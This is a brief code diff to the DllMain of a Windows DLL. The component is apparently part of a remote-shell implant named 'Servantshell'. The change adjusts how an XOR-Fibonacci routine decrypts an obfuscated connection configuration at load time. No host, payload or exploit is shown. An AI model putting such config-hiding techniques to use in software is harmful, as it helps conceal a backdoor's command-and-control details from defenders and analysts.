@@ -203,7 +203,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	case DLL_PROCESS_ATTACH:
 		g_hServantshell = hModule;
 #ifndef _DEBUG
-		XorFibonacciCrypt(&g_ConfigInfo, sizeof(g_ConfigInfo), &g_ConfigInfo, CONNECT_CONFIG_FACTOR1, CONNECT_CONFIG_FACTOR2);
+		XorFibonacciCrypt(((LPBYTE)&g_ConfigInfo) + sizeof(DWORD), sizeof(g_ConfigInfo) - sizeof(DWORD), ((LPBYTE)&g_ConfigInfo) + sizeof(DWORD), CONNECT_CONFIG_FACTOR1, CONNECT_CONFIG_FACTOR2);
 #endif
 		break;
 	case DLL_THREAD_ATTACH:
